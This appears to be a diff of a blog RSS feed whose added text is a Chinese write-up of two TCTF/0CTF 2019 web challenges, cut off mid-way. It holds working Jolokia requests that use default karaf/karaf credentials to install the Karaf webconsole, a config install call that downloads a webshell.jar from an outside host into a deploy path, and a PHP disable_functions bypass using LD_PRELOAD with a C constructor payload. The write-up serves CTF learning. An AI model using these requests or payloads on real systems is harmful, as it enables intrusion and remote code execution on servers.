@@ -1,1 +1,433 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Karaf on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/karaf/</link><description>Recent content in Karaf on Zeddy's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Wed, 03 Apr 2019 00:09:58 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/karaf/atom.xml" rel="self" type="application/rss+xml"/><item><title>TCTF/0CTF-Web 记录</title><link>https://zeddyu.github.io/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/</link><pubDate>Wed, 03 Apr 2019 00:09:58 +0000</pubDate><guid>https://zeddyu.github.io/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/</guid><description>&lt;p>上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Karaf on Zeddy's Blog</title><link>https://zeddyu.github.io/tags/karaf/</link><description>Recent content in Karaf on Zeddy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 03 Apr 2019 00:09:58 +0000</lastBuildDate><atom:link href="https://zeddyu.github.io/tags/karaf/atom.xml" rel="self" type="application/rss+xml"/><item><title>TCTF/0CTF-Web 记录</title><link>https://zeddyu.github.io/p/tctf/0ctf-web-%E8%AE%B0%E5%BD%95/</link><pubDate>Wed, 03 Apr 2019 00:09:58 +0000</pubDate><guid>https://zeddyu.github.io/p/tctf/0ctf-web-%E8%AE%B0%E5%BD%95/</guid><description>&lt;p>上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。&lt;/p>
+&lt;h1 id="web1-ghost-pepper">Web1 Ghost Pepper
+&lt;/h1>&lt;h2 id="description">Description
+&lt;/h2>&lt;blockquote>
+&lt;p>​ Do you know ghost pepper? Let&amp;rsquo;s eat. http://111.186.63.207:31337&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="hacking">Hacking
+&lt;/h2>&lt;p>由于环境关掉了，这里就不放图了。说一下几个解法。&lt;/p>
+&lt;p>首先通过弱口令 karaf/karaf 进行认证，进入发现是 jetty 的中间件，然后思路一直走偏在这个中间件上，直到有师傅跟我说 ghost pepper 指的是 Jolokia…nb&amp;hellip;&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009331.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>然后又参考了几篇腾讯云鼎的相关文章：&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.anquanke.com/post/id/103016" target="_blank" rel="noopener"
+>Exploiting Jolokia Agent with Java EE Servers&lt;/a>&lt;/p>
+&lt;p>尝试了 JNDI 注入，发现 proxymode 没开，所以得另想法子，在&lt;code>/jolokia/list&lt;/code> 我们发现了一些库，最终目标聚集到了 karaf 上。&lt;/p>
+&lt;p>第一种解法是通过激活 webconsole 这个 karaf 的 feature ，进入 webconsole ，这是一个类似 Tomcat Manager 后台的一个东西，进入之后可以上传 bundle ，并且勾选自动 refresh bundle ，就相当于上传了一个 webshell 一样，直接连就好了，关于 bunlde 的构建留到下面讲吧。还有就是进去 Main/gogo 的选项，就可以拿到 karaf 内置的一个 shell ，具体命令可以参考 &lt;a class="link" href="http://karaf.apache.org/manual/latest/#_shell_console_basics" target="_blank" rel="noopener"
+>Shell console basics&lt;/a>，通过&lt;code>shell:cat /flag&lt;/code>&lt;/p>
+&lt;p>激活 webconsole 的 payload 如下&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/jolokia&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">111.186.63.207:31337&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Type&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">application/json&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content-Length&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">146&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Authorization&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Basic a2FyYWY6a2FyYWY=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;EXEC&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;mbean&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;org.apache.karaf:name=root,type=feature&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;operation&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;installFeature(java.lang.String)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;arguments&amp;#34;&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="s2">&amp;#34;webconsole&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>还有其他的就是通过好几个&lt;code>/list&lt;/code>中的&lt;code>install&lt;/code>方法来实现。比如&lt;code>karaf.config&lt;/code>或者&lt;code>karaf.bundle&lt;/code>的方法都可以，具体方法的实现直接去下一个 karaf 源码来看看就知道了。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;type&amp;#34;:&amp;#34;EXEC&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;mbean&amp;#34;:&amp;#34;org.apache.karaf:name=root,type=config&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;operation&amp;#34;:&amp;#34;install&amp;#34;,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;arguments&amp;#34;:[&amp;#34;http://ip:port/webshell.jar&amp;#34;,&amp;#34;../../../../../opt/opendaylight-0.9.2/deploy/webshell.jar&amp;#34;,false]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这里&lt;code>karaf.config&lt;/code>是个 0day…可以写任意文件&lt;/p>
+&lt;p>这里利用的难点就是如何构造一个 bundle 文件了&amp;hellip;从来都不知道还有这种文件…而且是个&lt;code>.jar&lt;/code>文件，而且这个东西的触发点在&lt;code>start&lt;/code>函数，非&lt;code>main&lt;/code>函数&amp;hellip;可以按照马师傅的这个仓库来构建：&lt;a class="link" href="https://github.com/imagemlt/osgi-bundle-backdoor" target="_blank" rel="noopener"
+>osgi-bundle-backdoor&lt;/a>&lt;/p>
+&lt;h1 id="web2-wallbreaker-easy">Web2 Wallbreaker Easy
+&lt;/h1>&lt;h2 id="description-1">Description
+&lt;/h2>&lt;blockquote>
+&lt;p>​ http://111.186.63.208:31340&lt;/p>
+&lt;/blockquote>
+&lt;p>打开地址可以发现有更多的描述&lt;/p>
+&lt;blockquote>
+&lt;p>​ Imagick is a awesome library for hackers to break &lt;code>disable_functions&lt;/code>.&lt;/p>
+&lt;p>So I installed php-imagick in the server, opened a &lt;code>backdoor&lt;/code> for you.
+Let&amp;rsquo;s try to execute &lt;code>/readflag&lt;/code> to get the flag.
+Open basedir: /var/www/html:/tmp/7833d7f27adcba46bdfd6c9c31c89904
+Hint: eval($_POST[&amp;ldquo;backdoor&amp;rdquo;]);&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008570.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h2 id="the-first-way-to-hack">The first way to Hack
+&lt;/h2>&lt;p>一看题目意图也比较明显，需要我们利用&lt;code>Imagick&lt;/code>这个模块去进行 rce&lt;/p>
+&lt;p>我们先直接看看&lt;code>phpinfo()&lt;/code>，发现果然是能执行命令的基本都被 disable 掉了&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002789.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>我们还可以调用&lt;code>readfile()&lt;/code>来查看题目源代码&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/tmp/&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">$_SERVER[REMOTE_ADDR]&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">mkdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$dir&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ini_set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;open_basedir&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;/var/www/html:&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$dir&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;style&amp;gt;.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;pre class=&amp;#34;pre&amp;#34;&amp;gt;&amp;lt;code&amp;gt;Imagick is a awesome library for hackers to break `disable_functions`.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">So I installed php-imagick in the server, opened a `backdoor` for you.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Let&amp;#39;s try to execute `/readflag` to get the flag.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Open basedir: &amp;lt;?php echo ini_get(&amp;#39;open_basedir&amp;#39;);?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;?php eval($_POST[&amp;#34;backdoor&amp;#34;]);?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Hint: eval($_POST[&amp;#34;backdoor&amp;#34;]);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Hint: eval($_POST[&amp;#34;backdoor&amp;#34;]);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>首先我们来了解一下题目涉及的几个函数&lt;/p>
+&lt;h3 id="open_basedir">open_basedir
+&lt;/h3>&lt;p>{% colorquote info %}&lt;/p>
+&lt;p>open_basedir 将 php 所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如&lt;code>fopen()&lt;/code>或&lt;code>file_get_contents()&lt;/code>打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。&lt;/p>
+&lt;p>{% endcolorquote %}&lt;/p>
+&lt;p>例如就像这样，设置了&lt;code>ini_set('open_basedir','/var/www/html');&lt;/code>之后，我们只能在&lt;code>/var/www/html&lt;/code>进行操作，即&lt;code>open_basedir&lt;/code>是用来限制访问目录的&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006126.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="bypass-open_basedir">Bypass Open_Basedir
+&lt;/h3>&lt;p>详细可参考&lt;a class="link" href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/" target="_blank" rel="noopener"
+>How to bypass disable_functions and open_basedir&lt;/a>，文章中就提到可以使用&lt;code>LD_PRELOAD&lt;/code>和&lt;code>putenv()&lt;/code>函数进行绕过&lt;/p>
+&lt;h3 id="ld_preload">LD_PRELOAD
+&lt;/h3>&lt;p>我们首先来看看什么是&lt;code>LD_PRELOAD&lt;/code>&lt;/p>
+&lt;p>{% colorquote info %}&lt;/p>
+&lt;p>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will &lt;strong>load&lt;/strong> &lt;strong>before&lt;/strong> &lt;strong>any&lt;/strong> other &lt;strong>shared&lt;/strong> &lt;strong>library&lt;/strong> &lt;strong>including&lt;/strong> the C runtime &lt;strong>library&lt;/strong> (libc.so) This &lt;strong>is&lt;/strong> called preloading a library.&lt;/p>
+&lt;p>{% endcolorquote %}&lt;/p>
+&lt;p>简单来说，&lt;code>LD_PRELOAD&lt;/code>这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。&lt;/p>
+&lt;p>{% colorquote info %}&lt;/p>
+&lt;p>putenv ( string &lt;code>$setting&lt;/code> ) : bool&lt;/p>
+&lt;p>添加 &lt;code>setting&lt;/code> 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。&lt;/p>
+&lt;p>{% endcolorquote %}&lt;/p>
+&lt;p>而&lt;code>putenv()&lt;/code>可以设置环境换变量，添加我们定义的变量到服务器环境变量。&lt;/p>
+&lt;p>那么我们大概可以有一个思路，制作一个恶意的&lt;code>.so&lt;/code>文件，使用&lt;code>putenv()&lt;/code>设置&lt;code>LD_PRELOAD&lt;/code>为恶意文件路径，然后使用某个php函数，触发这个&lt;code>.so&lt;/code>文件，执行我们的恶意代码。&lt;/p>
+&lt;p>具体的攻击链可以参考：&lt;a class="link" href="https://www.cnblogs.com/net66/p/5609026.html" target="_blank" rel="noopener"
+>LD_PRELOAD的偷梁换柱之能&lt;/a>&lt;/p>
+&lt;h3 id="劫持攻击">劫持攻击
+&lt;/h3>&lt;p>参考的绕过文章使用了&lt;code>mail()&lt;/code>函数，我们可以看看&lt;/p>
+&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004191.jpg"
+loading="lazy"
+>&lt;/p>
+&lt;p>这里确实开启了子进程，那我们再试试引入&lt;code>putenv()&lt;/code>的效果，配合动态链接库尝试劫持，代码来自&lt;a class="link" href="https://github.com/TarlogicSecurity/Chankro" target="_blank" rel="noopener"
+>Chankro&lt;/a>&lt;/p>
+&lt;p>其中&lt;code>__attribute__ ((__constructor__))&lt;/code>有如下说明&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span>&lt;span class="n">It&lt;/span>&lt;span class="s1">&amp;#39;s run when a shared library is loaded, typically during program startup.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span>&lt;span class="n">That&lt;/span>&lt;span class="s1">&amp;#39;s how all GCC attributes are; presumably to distinguish them from function calls.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">3.&lt;/span>&lt;span class="n">The&lt;/span> &lt;span class="n">destructor&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">run&lt;/span> &lt;span class="n">when&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">shared&lt;/span> &lt;span class="n">library&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">unloaded&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">typically&lt;/span> &lt;span class="n">at&lt;/span> &lt;span class="n">program&lt;/span> &lt;span class="n">exit&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>所以当我们使用上我们的动态链接库后，就会触发&lt;code>__attribute__ ((__constructor__))&lt;/code>，从而达成我们rce的目的。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define _GNU_SOURCE
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/stat.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;signal.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ls&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;echo hacked&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">daemonize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">signal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SIGHUP&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SIG_IGN&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">fork&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">__attribute__&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">__constructor__&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">preloadme&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">unsetenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">daemonize&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>使用以下命令产生动态链接库&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
